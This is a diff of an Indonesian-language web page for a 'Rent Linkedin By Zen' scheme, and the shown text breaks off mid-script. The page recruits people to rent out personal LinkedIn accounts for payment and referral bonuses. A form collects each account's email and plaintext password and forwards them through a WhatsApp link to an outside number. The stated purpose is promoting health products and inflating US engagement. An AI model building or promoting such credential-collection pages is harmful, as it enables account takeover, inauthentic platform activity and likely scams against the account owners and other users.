@@ -1,310 +1,722 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Syarat & Ketentuan Rent By Zen 7777 ⭐</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Latar Belakang Kubus PlayStation</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&family=Raleway:wght@900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome untuk ikon WhatsApp -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
-            background-color: #1a1a2e;
-            color: #e0e0e0;
-            font-family: 'Roboto', sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: auto;
-            min-height: 100vh;
-            padding: 2rem 1rem;
-            position: relative;
-            overflow-x: hidden;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: 'Raleway', sans-serif;
         }
-
-        /* --- Animasi Latar Belakang & Efek --- */
-        .pixel-grid {
+        canvas {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -2;
-            background-image: linear-gradient(to right, #242442 1px, transparent 1px), linear-gradient(to bottom, #242442 1px, transparent 1px);
-            background-size: 25px 25px;
-            animation: moveGrid 10s linear infinite;
+            width: 100vw;
+            height: 100vh;
+            display: block;
+            z-index: -1;
         }
-
-        @keyframes moveGrid {
-            from { background-position: 0 0; }
-            to { background-position: 25px 25px; }
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem 1rem;
+            max-width: 300px;
+            margin: 0 auto;
+            z-index: 10;
+            position: relative;
         }
-
-        /* Scanline Effect */
-        body::before {
+        .capsule-button-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 9999px;
+            border: 2px solid #D1D5DB;
+            overflow: hidden;
+            margin-top: 1rem;
+        }
+        .capsule-button {
+            padding: 0.5rem 1rem;
+            font-size: 0.75rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: background-color 0.2s ease-in-out;
+            color: #1F2937;
+            background-color: #F3F4F6;
+            position: relative;
+        }
+        .capsule-button:not(:last-child)::after {
             content: '';
-            position: fixed;
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 60%;
+            width: 2px;
+            background-color: #D1D5DB;
+        }
+        .capsule-button:hover {
+            background-color: #E5E7EB;
+        }
+        .divider {
+            position: relative;
+            width: 100%;
+            height: 2px;
+            background-color: #D1D5DB;
+            margin-top: 1.5rem;
+        }
+        .divider::after {
+            content: '⚜️';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #f0f0f0;
+            padding: 0 0.5rem;
+            font-size: 1rem;
+            color: #D1D5DB;
+        }
+        .content-card {
+            background-color: rgba(255, 255, 255, 0.5);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            text-align: left;
+            border: 1px solid rgba(209, 213, 219, 0.7);
+            font-family: 'Lato', sans-serif;
+            font-weight: 700;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            
+            /* Animasi untuk konten */
+            opacity: 0;
+            transform: scale(0.95);
+            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+        }
+
+        .content-card.active {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .content-card.hidden {
+            display: none;
+        }
+
+        .content-card h2 {
+            margin-bottom: 0.5rem;
+        }
+        .content-card li, .content-card p {
+            font-weight: 400;
+        }
+        .form-group {
+            margin-bottom: 0.75rem;
+        }
+        .form-label {
+            display: block;
+            margin-bottom: 0.25rem;
+            font-size: 0.875rem;
+        }
+        .form-input, .form-select {
+            width: 100%;
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            border: 1px solid #D1D5DB;
+            background-color: rgba(255, 255, 255, 0.8);
+            font-size: 0.875rem;
+        }
+        .form-select-group {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        /* Coin rain animation */
+        .coin-rain {
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             pointer-events: none;
-            z-index: -1;
-            background: repeating-linear-gradient(
-                to bottom,
-                rgba(0, 0, 0, 0.1) 0%,
-                rgba(0, 0, 0, 0.1) 1px,
-                transparent 1px,
-                transparent 2px
-            );
+            overflow: hidden;
         }
 
-        /* --- Animasi Teks & Tombol --- */
-        .text-neon {
-            text-shadow: 0 0 5px #ff00ff, 0 0 10px #00ffff;
-            animation: pulsateNeon 1.5s infinite ease-in-out alternate;
+        .coin {
+            position: absolute;
+            top: -10%;
+            font-size: 2rem;
+            animation: fall linear infinite;
         }
-        
-        @keyframes pulsateNeon {
-            from {
-                text-shadow: 0 0 5px #ff00ff, 0 0 10px #00ffff;
-            }
+
+        @keyframes fall {
             to {
-                text-shadow: 0 0 10px #ff00ff, 0 0 20px #00ffff;
+                transform: translateY(110vh) rotate(360deg);
+                opacity: 0;
             }
         }
         
-        .btn-retro {
-            background-color: #4CAF50;
-            color: white;
-            border: 2px solid #388E3C;
-            text-shadow: 2px 2px #1c4b1d;
-            box-shadow: 4px 4px 0px 0px #388E3C;
-            transition: all 0.1s ease-in-out;
-            animation: pulsateButton 2s infinite ease-in-out alternate;
-        }
-
-        .btn-retro:hover {
-            transform: translate(1px, 1px);
-            box-shadow: 3px 3px 0px 0px #388E3C;
-        }
-
-        .btn-retro:active {
-            transform: translate(3px, 3px);
-            box-shadow: 1px 1px 0px 0px #388E3C;
-        }
-        
-        @keyframes pulsateButton {
-            from {
-                transform: scale(1);
-            }
-            to {
-                transform: scale(1.02);
-            }
-        }
-
-        .dashed-border {
-            border-bottom: 2px dashed #5d429a;
-        }
-
-        /* --- Style Layar Sambutan --- */
-        #welcome-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
+        /* Table styling */
+        .reward-table {
             width: 100%;
-            height: 100%;
-            background-color: #1a1a2e;
+            border-collapse: collapse;
+            margin-top: 1rem;
+            font-weight: normal;
+        }
+        .reward-table th, .reward-table td {
+            border: 1px solid rgba(209, 213, 219, 0.7);
+            padding: 0.5rem;
+            text-align: center;
+        }
+        .reward-table th {
+            background-color: rgba(229, 231, 235, 0.7);
+        }
+        .whatsapp-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.5rem 1rem;
+            background-color: #25D366;
+            color: white;
+            border-radius: 9999px;
+            font-weight: bold;
+            margin-top: 1rem;
+            transition: background-color 0.2s;
+        }
+        .whatsapp-button:hover {
+            background-color: #128C7E;
+        }
+
+        /* Referral card specific styles */
+        .referral-section {
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            z-index: 999;
             text-align: center;
-            animation: fadeIn 1s ease-in-out;
+            margin-top: 1rem;
         }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .welcome-title {
+        .referral-icon {
             font-size: 2.5rem;
-            font-weight: bold;
-            color: #fff;
-            margin-bottom: 2rem;
-            animation: glitch-text 1s linear infinite;
+            color: #0072b2;
+            margin-bottom: 0.5rem;
         }
-
-        /* Glitch Effect Animation */
-        @keyframes glitch-text {
-            0% {
-                text-shadow: 0.05em 0 0 #00fffc, -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #fffc00;
-            }
-            15% {
-                text-shadow: 0.05em 0 0 #00fffc, -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #fffc00;
-            }
-            16% {
-                text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.05em 0 #ff00ff, -0.05em 0.05em 0 #fffc00;
-            }
-            18% {
-                text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.05em 0 #ff00ff, -0.05em 0.05em 0 #fffc00;
-            }
-            19% {
-                text-shadow: -0.025em -0.025em 0 #00fffc, -0.05em -0.025em 0 #ff00ff, -0.025em 0.05em 0 #fffc00;
-            }
-            21% {
-                text-shadow: -0.025em -0.025em 0 #00fffc, -0.05em -0.025em 0 #ff00ff, -0.025em 0.05em 0 #fffc00;
-            }
-            22% {
-                text-shadow: 0.05em 0 0 #00fffc, -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #fffc00;
-            }
-            30% {
-                text-shadow: 0.05em 0 0 #00fffc, -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #fffc00;
-            }
-            31% {
-                text-shadow: 0.05em 0 0 #00fffc, -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #fffc00;
-            }
-            50% {
-                text-shadow: 0.05em 0 0 #00fffc, -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #fffc00;
-            }
-            51% {
-                text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.05em 0 #ff00ff, -0.05em 0.05em 0 #fffc00;
-            }
-            55% {
-                text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.05em 0 #ff00ff, -0.05em 0.05em 0 #fffc00;
-            }
-            100% {
-                text-shadow: 0.05em 0 0 #00fffc, -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #fffc00;
-            }
-        }
-        
-        @keyframes fadeOut {
-            from { opacity: 1; }
-            to { opacity: 0; }
+        .referral-table-container {
+            width: 100%;
+            overflow-x: auto;
         }
     </style>
 </head>
-<body>
-    <!-- Audio untuk Musik Latar -->
-    <audio id="background-music" loop>
-        <source src="musik.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
+<body class="bg-gray-100">
+    <canvas id="canvas3D"></canvas>
 
-    <!-- Layar Sambutan -->
-    <div id="welcome-screen" class="transition-opacity duration-1000 ease-in opacity-100">
-        <h1 class="welcome-title text-neon">Selamat datang di<br>Rent Linkedin By Zen 7777 code ⭐</h1>
-        <button class="btn-retro px-8 py-4 text-lg font-bold" onclick="showMainContent()">LANJUTKAN</button>
-    </div>
+    <div class="main-container">
+        <h1 class="text-2xl font-extrabold text-[#0072b2] tracking-wide drop-shadow-lg leading-tight text-center w-full">
+            Rent Linkedin By Zen
+        </h1>
+        <div class="capsule-button-container">
+            <button id="beranda-btn" class="capsule-button">
+                Beranda
+            </button>
+            <button id="reward-btn" class="capsule-button">
+                Reward
+            </button>
+            <button id="rent-btn" class="capsule-button">
+                Rent
+            </button>
+            <button id="reff-btn" class="capsule-button">
+                Reff
+            </button>
+        </div>
+        <div class="divider"></div>
 
-    <!-- Konten Utama (Awalnya tersembunyi) -->
-    <div id="main-content" style="display: none;">
-        <!-- Background Elements -->
-        <div class="pixel-grid"></div>
+        <!-- Beranda Content -->
+        <div id="beranda-content" class="content-card active">
+            <div>
+                <h2 class="text-lg font-bold text-gray-800">Kriteria Wajib</h2>
+                <ul class="list-disc list-inside space-y-2 text-sm text-gray-700 mt-2">
+                    <li>dibuat sebelum Mei 2024.</li>
+                    <li>Minimal 20 koneksi.</li>
+                    <li>Akun Pribadi.</li>
+                    <li>1 Wa 1 akun.</li>
+                </ul>
+                <p class="mt-4 text-xs italic text-gray-600">
+                    <span class="font-bold">Catatan:</span> Jika koneksi Anda kurang dari 20, kirimkan link profil LinkedIn Anda ke admin agar bisa dibantu GB koneksi.
+                </p>
+            </div>
+            
+            <div>
+                <h2 class="text-lg font-bold text-gray-800">Jadwal Zen</h2>
+                <ul class="list-disc list-inside space-y-2 text-sm text-gray-700 mt-2">
+                    <li>Collect Akun: Kamis - Selasa mulai jam 8 malam.</li>
+                    <li>Payment: Setiap Rabu - Kamis.</li>
+                </ul>
+            </div>
 
-        <div class="text-center w-full max-w-2xl relative z-10 mx-auto">
-            <h1 class="text-3xl md:text-4xl font-bold mb-4 text-white text-neon">SYARAT & KETENTUAN <br> RENT BY ZEN</h1>
-            <p class="text-xs md:text-sm mb-6 px-4 py-2 border-2 border-yellow-400 font-bold text-yellow-400">
-                ⚠️ KEPUTUSAN FULL DITANGAN ANDA ⚠️
+            <!-- "Untuk apa akun kalian?" Card, dipindahkan ke sini -->
+            <div>
+                <h2 class="text-md font-bold text-gray-800 mb-2">Untuk apa akun kalian?</h2>
+                <ul class="list-disc list-inside text-sm text-gray-700">
+                    <li>Untuk promosi produk-produk kesehatan dan sebagainya, dan juga untuk menaikkan *engagement* di region US.</li>
+                </ul>
+                <p class="mt-4 text-sm font-bold text-red-600 text-center">
+                    ⚠️ Bukan untuk tindak kriminal scam ⚠️
+                </p>
+            </div>
+        </div>
+
+        <!-- Reward Content -->
+        <div id="reward-content" class="content-card hidden">
+            <div class="coin-rain"></div>
+            <h2 class="text-lg font-bold text-gray-800">Detail Payment</h2>
+            <ul class="list-inside space-y-3 text-sm text-gray-700 mt-2">
+                <li class="flex items-center space-x-2">
+                    <span class="text-yellow-500">💰</span>
+                    <span>Dibayar setiap Minggu (Rabu/Kamis).</span>
+                </li>
+                <li class="flex items-center space-x-2">
+                    <span class="text-yellow-500">💎</span>
+                    <span>$10/160Rb untuk akun Normal.</span>
+                </li>
+                <li class="flex items-center space-x-2">
+                    <span class="text-yellow-500">🚀</span>
+                    <span>$15/240Rb untuk akun Unrestric.</span>
+                </li>
+                <li class="flex items-center space-x-2">
+                    <span class="text-yellow-500">🛡️</span>
+                    <span>$1/day untuk akun yang terkena restric dan ga bisa dibuka.</span>
+                </li>
+            </ul>
+            <p class="text-center text-sm font-bold text-green-600 mt-2">
+                💰 Bisa Claim DP $1 setelah Agent Bule log in!
             </p>
+        </div>
+        
+        <!-- Rent Form Content -->
+        <div id="rent-content" class="content-card hidden">
+            <h2 class="text-lg font-bold text-gray-800 text-center">Form New Acc</h2>
+            <form id="new-acc-form" class="space-y-4">
+                <div class="form-group">
+                    <label for="email" class="form-label">Email</label>
+                    <input type="email" id="email" class="form-input" required>
+                </div>
+                <div class="form-group">
+                    <label for="password" class="form-label">Password</label>
+                    <input type="password" id="password" class="form-input" required>
+                </div>
+                <div class="form-group">
+                    <label for="koneksi" class="form-label">Koneksi (isi bebas)</label>
+                    <input type="number" id="koneksi" class="form-input" min="0" required>
+                    <p id="koneksi-warning" class="text-xs text-red-600 italic mt-1 hidden">Tidak memenuhi syarat</p>
+                </div>
+                <div class="form-group">
+                    <label for="tahun" class="form-label">Tahun & Bulan</label>
+                    <div class="form-select-group">
+                        <select id="tahun" class="form-select">
+                            <option value="">Tahun</option>
+                        </select>
+                        <select id="bulan" class="form-select">
+                            <option value="">Bulan</option>
+                        </select>
+                    </div>
+                    <p id="usia-warning" class="text-xs text-red-600 italic mt-1 hidden">Tidak memenuhi syarat</p>
+                </div>
+                <div class="form-group">
+                    <label for="kode" class="form-label">Kode</label>
+                    <input type="text" id="kode" class="form-input" value="7777" disabled>
+                </div>
+                <button type="button" id="submit-btn" class="w-full py-2 px-4 rounded-full text-white font-bold transition-all duration-200" style="background-color: #0072b2;">
+                    Kirim New Acc
+                </button>
+                <button type="button" id="unrestrict-btn" class="w-full py-2 px-4 rounded-full text-white font-bold transition-all duration-200" style="background-color: #6c757d;">
+                    Kirim Unrestrict
+                </button>
+            </form>
+            <div class="mt-4 text-xs italic text-gray-600 text-center">
+                <p>- Pilih **Kirim New Acc** jika kamu belum pernah kirim akun ke agent.</p>
+                <p>- Pilih **Kirim Unrestrict** jika akun kamu sudah terbuka dari *restrict* atau batasan.</p>
+            </div>
+        </div>
 
-            <!-- DETAIL REWARD SECTION -->
-            <div class="w-full bg-transparent px-4 py-2 mt-4">
-                <h2 class="text-xl md:text-2xl font-bold mb-2 text-white text-neon">DETAIL REWARD ⬇️</h2>
-                <div class="w-full bg-transparent px-4 py-2 mb-4">
-                    <table class="w-full text-left text-sm md:text-base border-collapse">
+        <!-- Reff Card Content -->
+        <div id="reff-content" class="content-card hidden">
+            <div class="referral-section">
+                <i class="fas fa-users referral-icon"></i>
+                <h2 class="text-lg font-bold text-gray-800">Skema Referral</h2>
+                
+                <p class="mt-2 text-sm text-gray-700">
+                    Ajak teman-teman Anda dan dapatkan komisi menarik dari setiap akun yang berhasil direferralkan!
+                </p>
+
+                <div class="referral-table-container mt-4">
+                    <h3 class="text-md font-bold text-gray-800 mb-2">Rate Normal</h3>
+                    <table class="reward-table">
+                        <thead>
+                            <tr>
+                                <th>Invite</th>
+                                <th>Reward</th>
+                            </tr>
+                        </thead>
                         <tbody>
                             <tr>
-                                <td class="py-2 px-4 dashed-border">Save</td>
-                                <td class="py-2 px-4 dashed-border font-bold">$10</td>
+                                <td>1 👤</td>
+                                <td>$2</td>
                             </tr>
                             <tr>
-                                <td class="py-2 px-4 dashed-border">Unrestrict</td>
-                                <td class="py-2 px-4 dashed-border font-bold">$5+$5</td>
+                                <td>2 👤</td>
+                                <td>$4</td>
                             </tr>
                             <tr>
-                                <td class="py-2 px-4">Restric</td>
-                                <td class="py-2 px-4 font-bold">TIDAK AKAN DIBAYAR</td>
+                                <td>3 👤</td>
+                                <td>$6</td>
                             </tr>
                         </tbody>
                     </table>
                 </div>
 
-                <p class="text-xs md:text-sm mt-4 mb-2 text-white italic">
-                    <span class="font-bold">Nb:</span> Rules bisa sewaktu waktu berubah, dan rules ini dibuat oleh admin sendiri. Admin tidak akan menerima Drama apapun di hari Payment ⚠️
-                </p>
-
-                <h3 class="text-base md:text-lg font-bold mt-6 text-white text-neon">PENJELASAN ⬇️</h3>
-                <div class="text-left text-sm md:text-base mt-2 space-y-2">
-                    <p>
-                        <span class="font-bold text-neon">Save</span> yaitu jika akun kamu aman sampai Hari Payment yaitu Rabu Malam tanpa terkena Batasan.
+                <div class="referral-table-container mt-4">
+                    <h3 class="text-md font-bold text-gray-800 mb-2">Rate Khusus</h3>
+                    <p class="text-xs italic text-gray-600 mb-2">
+                        (Berlaku jika kamu undang lebih dari 10 orang)
                     </p>
-                    <p>
-                        <span class="font-bold text-neon">Unrestrict</span> yaitu jika akun kamu terkena batasan lalu bisa dibuka kembali.
-                    </p>
-                    <p>
-                        <span class="font-bold text-neon">Restric</span> yaitu akun anda terkena batasan.
-                    </p>
+                    <table class="reward-table">
+                        <thead>
+                            <tr>
+                                <th>Invite</th>
+                                <th>Reward</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>1 👤</td>
+                                <td>$3</td>
+                            </tr>
+                            <tr>
+                                <td>2 👤</td>
+                                <td>$6</td>
+                            </tr>
+                            <tr>
+                                <td>3 👤</td>
+                                <td>$9</td>
+                            </tr>
+                        </tbody>
+                    </table>
                 </div>
-            </div>
-
-            <!-- SYARAT & KETENTUAN SECTION -->
-            <div class="w-full bg-transparent px-4 py-2 mt-12">
-                <h2 class="text-xl md:text-2xl font-bold mb-4 text-white text-neon">SYARAT SEWA ⬇️</h2>
-                <table class="w-full text-left text-sm md:text-base border-collapse">
-                    <tbody>
-                        <tr>
-                            <td class="py-2 px-4 dashed-border">Usia Akun</td>
-                            <td class="py-2 px-4 dashed-border font-bold">DI ATAS 1 TAHUN (MIN. MEI 2024)</td>
-                        </tr>
-                        <tr>
-                            <td class="py-2 px-4">Minimal Koneksi</td>
-                            <td class="py-2 px-4 font-bold">20 KONEKSI</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-
-            <div class="text-xs md:text-sm mt-4 px-4 py-2 bg-transparent">
-                <p class="mb-2 text-white">NB: JIKA BELUM 20 KONEKSI HARAP GB KONEKSI DULU SESAMA MEMBER.</p>
-                <p class="font-bold text-white">LINK GRUP GB KONEKSI ⬇️</p>
-            </div>
-
-            <div class="flex flex-col md:flex-row justify-center gap-4 mt-8">
-                <a href="https://chat.whatsapp.com/Lcl2FNwZacCKdfrl7Grb1C" target="_blank" class="w-full md:w-auto">
-                    <button class="btn-retro px-6 py-3 w-full">GB 1</button>
-                </a>
-                <a href="https://chat.whatsapp.com/Lcl2FNwZacCKdfrl7Grb1C?mode=ems_copy_t" target="_blank" class="w-full md:w-auto">
-                    <button class="btn-retro px-6 py-3 w-full">GB 2</button>
-                </a>
-                <a href="https://chat.whatsapp.com/DuVs2jl1lK9Dt6akRsx6GL" target="_blank" class="w-full md:w-auto">
-                    <button class="btn-retro px-6 py-3 w-full">GB 3</button>
+                
+                <p class="text-xs font-bold text-red-600 mt-4">
+                    ⚠️ -$1 jika referralmu terkena restric
+                </p>
+                
+                <p class="text-sm italic text-gray-700 mt-4">
+                    Jika kamu mencapai **30 referral**, maka bisa claim bonus **$20 - $30** ketika payment.
+                </p>
+                
+                <a href="https://wa.me/62859106914815?text=Halo%20Admin%2C%20saya%20tertarik%20untuk%20mendaftar%20sebagai%20pengundang." target="_blank" class="whatsapp-button">
+                    <i class="fab fa-whatsapp mr-2 text-lg"></i>
+                    Hubungi Admin
                 </a>
             </div>
         </div>
     </div>
 
-    <!-- Script untuk Mengontrol Audio dan Tampilan -->
+    <!-- Three.js Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+
     <script>
-        function showMainContent() {
-            const welcomeScreen = document.getElementById('welcome-screen');
-            const mainContent = document.getElementById('main-content');
-            const backgroundMusic = document.getElementById('background-music');
+        window.onload = function() {
+            // Initialize scene, camera, and renderer for 3D animation
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('canvas3D'), antialias: true, alpha: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+
+            // Add white fog effect to the scene
+            scene.fog = new THREE.Fog(0xf0f0f0, 1, 400);
+
+            // Define PlayStation logo colors
+            const colors = [
+                0x0072b2, // Blue
+                0xeb0029, // Red
+                0x00a74a, // Green
+                0xff0084, // Pink
+            ];
+
+            const cubes = [];
+            const numCubes = 500; 
+
+            // Create and position cubes randomly in space
+            for (let i = 0; i < numCubes; i++) {
+                const color = new THREE.Color(colors[Math.floor(Math.random() * colors.length)]);
+                const geometry = new THREE.BoxGeometry(3, 3, 3); 
+                const material = new THREE.MeshBasicMaterial({ color: color, transparent: true, opacity: 1.0 }); 
+                const cube = new THREE.Mesh(geometry, material);
+
+                // Random initial position
+                cube.position.x = (Math.random() - 0.5) * 800;
+                cube.position.y = (Math.random() - 0.5) * 800;
+                cube.position.z = (Math.random() - 0.5) * 800;
+
+                // Random velocity moving the cube forward
+                cube.userData.velocity = new THREE.Vector3(
+                    (Math.random() - 0.5) * 0.1,
+                    (Math.random() - 0.5) * 0.1,
+                    -1 - Math.random() * 2 
+                );
+
+                scene.add(cube);
+                cubes.push(cube);
+            }
+
+            camera.position.z = 200;
+
+            // Animation loop
+            const animate = () => {
+                requestAnimationFrame(animate);
+
+                cubes.forEach(cube => {
+                    // Update cube position based on its velocity
+                    cube.position.add(cube.userData.velocity);
+
+                    // If a cube is too far behind, reset its position
+                    if (cube.position.z < -400) {
+                        cube.position.z = 400;
+                        cube.position.x = (Math.random() - 0.5) * 800;
+                        cube.position.y = (Math.random() - 0.5) * 800;
+                    }
+
+                    // Add rotation to the cube
+                    cube.rotation.x += cube.userData.velocity.x * 0.05;
+                    cube.rotation.y += cube.userData.velocity.y * 0.05;
+                });
+
+                renderer.render(scene, camera);
+            };
+
+            // Adjust renderer and camera size on window resize
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+
+            animate();
+
+            // --- Logika Menu dan Formulir ---
+            const berandaBtn = document.getElementById('beranda-btn');
+            const rewardBtn = document.getElementById('reward-btn');
+            const rentBtn = document.getElementById('rent-btn');
+            const reffBtn = document.getElementById('reff-btn');
             
-            // Memutar musik
-            backgroundMusic.play();
+            // Dapatkan semua konten card
+            const berandaContent = document.getElementById('beranda-content');
+            const rewardContent = document.getElementById('reward-content');
+            const rentContent = document.getElementById('rent-content');
+            const reffContent = document.getElementById('reff-content');
             
-            // Menyembunyikan layar sambutan dengan animasi
-            welcomeScreen.style.animation = 'fadeOut 1s ease-in-out forwards';
+            const allContentCards = [berandaContent, rewardContent, rentContent, reffContent];
+
+            const coinRain = document.querySelector('.coin-rain');
+            let coinInterval = null;
+
+            // Fungsi untuk menampilkan konten yang dipilih dan menyembunyikan yang lain dengan animasi
+            function showContent(contentToShow) {
+                allContentCards.forEach(content => {
+                    if (content === contentToShow) {
+                        content.classList.remove('hidden');
+                        setTimeout(() => {
+                            content.classList.add('active');
+                        }, 10); // sedikit delay agar transisi CSS berjalan
+                    } else {
+                        content.classList.remove('active');
+                        content.classList.add('hidden');
+                    }
+                });
+            }
+
+            // Fungsi untuk membuat koin jatuh
+            function createCoin() {
+                const coin = document.createElement('span');
+                coin.classList.add('coin');
+                coin.textContent = '🪙';
+                coin.style.left = `${Math.random() * 100}%`;
+                coin.style.animationDuration = `${Math.random() * 2 + 3}s`; // 3-5s
+                coin.style.opacity = Math.random() * 0.5 + 0.5; // 0.5-1.0
+                coinRain.appendChild(coin);
+
+                // Remove coin after animation
+                coin.addEventListener('animationend', () => {
+                    coin.remove();
+                });
+            }
+
+            berandaBtn.addEventListener('click', () => {
+                showContent(berandaContent);
+                if (coinInterval) {
+                    clearInterval(coinInterval);
+                    coinRain.innerHTML = ''; // Hapus koin yang ada
+                }
+            });
             
-            // Menunggu animasi fade-out selesai sebelum menampilkan konten utama
-            setTimeout(() => {
-                welcomeScreen.style.display = 'none';
-                mainContent.style.display = 'block';
-            }, 1000);
+            rewardBtn.addEventListener('click', () => {
+                showContent(rewardContent);
+                // Mulai animasi hujan koin
+                if (!coinInterval) {
+                    // Interval diubah dari 300 menjadi 800ms
+                    coinInterval = setInterval(createCoin, 800); 
+                }
+            });
+            
+            rentBtn.addEventListener('click', () => {
+                showContent(rentContent);
+                if (coinInterval) {
+                    clearInterval(coinInterval);
+                    coinRain.innerHTML = '';
+                }
+            });
+            
+            // Tambahkan event listener untuk tombol Reff untuk menampilkan konten info
+            reffBtn.addEventListener('click', () => {
+                showContent(reffContent);
+                if (coinInterval) {
+                    clearInterval(coinInterval);
+                    coinRain.innerHTML = '';
+                }
+            });
+
+            // Logika Formulir
+            const tahunSelect = document.getElementById('tahun');
+            const bulanSelect = document.getElementById('bulan');
+            const koneksiInput = document.getElementById('koneksi');
+            const submitBtn = document.getElementById('submit-btn');
+            const unrestrictBtn = document.getElementById('unrestrict-btn');
+
+            const koneksiWarning = document.getElementById('koneksi-warning');
+            const usiaWarning = document.getElementById('usia-warning');
+
+            const currentYear = new Date().getFullYear();
+            const months = [
+                'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni',
+                'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'
+            ];
+            
+            // Isi dropdown tahun
+            for (let i = 2010; i <= currentYear; i++) {
+                const option = document.createElement('option');
+                option.value = i;
+                option.textContent = i;
+                tahunSelect.appendChild(option);
+            }
+
+            // Isi dropdown bulan
+            months.forEach((month, index) => {
+                const option = document.createElement('option');
+                option.value = index + 1;
+                option.textContent = month;
+                bulanSelect.appendChild(option);
+            });
+
+            // Validasi koneksi
+            koneksiInput.addEventListener('input', () => {
+                if (koneksiInput.value < 20 && koneksiInput.value !== '') {
+                    koneksiWarning.classList.remove('hidden');
+                } else {
+                    koneksiWarning.classList.add('hidden');
+                }
+            });
+
+            // Validasi usia akun
+            function checkAccountAge() {
+                const selectedYear = parseInt(tahunSelect.value, 10);
+                const selectedMonth = parseInt(bulanSelect.value, 10);
+                
+                const validYear = 2024;
+                const validMonth = 5; // Mei
+                
+                if (selectedYear > validYear || (selectedYear === validYear && selectedMonth > validMonth)) {
+                    usiaWarning.classList.remove('hidden');
+                } else {
+                    usiaWarning.classList.add('hidden');
+                }
+            }
+            
+            tahunSelect.addEventListener('change', checkAccountAge);
+            bulanSelect.addEventListener('change', checkAccountAge);
+            
+            // Kirim data ke WhatsApp
+            submitBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                
+                // Cek validasi sebelum kirim
+                if (koneksiInput.value < 20 || !usiaWarning.classList.contains('hidden')) {
+                    alert('Data tidak valid. Silakan periksa kembali formulir.');
+                    return;
+                }
+
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                const koneksi = koneksiInput.value;
+                const tahun = tahunSelect.value;
+                const bulan = bulanSelect.options[bulanSelect.selectedIndex].text;
+                const kode = document.getElementById('kode').value;
+                
+                if (!email || !password || !koneksi || !tahun || !bulan) {
+                    alert('Mohon isi semua kolom!');
+                    return;
+                }
+                
+                const whatsappNumber = '+16823134027';
+                const message = `
+*Form New Acc*
+
+Email: ${email}
+Password: ${password}
+Connection: ${koneksi}
+Year: ${tahun}
+Month: ${bulan}
+Code: ${kode}
+                `;
+                
+                const encodedMessage = encodeURIComponent(message);
+                const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodedMessage}`;
+                
+                window.open(whatsappUrl, '_blank');
+            });
+            
+            // Tombol Kirim Unrestrict
+            unrestrictBtn.addEventListener('click', () => {
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                const kode = document.getElementById('kode').value;
+                
+                if (!email || !password || !kode) {
+                    alert('Mohon isi kolom Email, Password, dan Kode!');
+                    return;
+                }
+
+                const whatsappNumber = '+16823134027';
+                const message = `
+*Send an unrestric account*
+
+Email: ${email}
+Password: ${password}
+Code: ${kode}
+                `;
+                
+                const encodedMessage = encodeURIComponent(message);
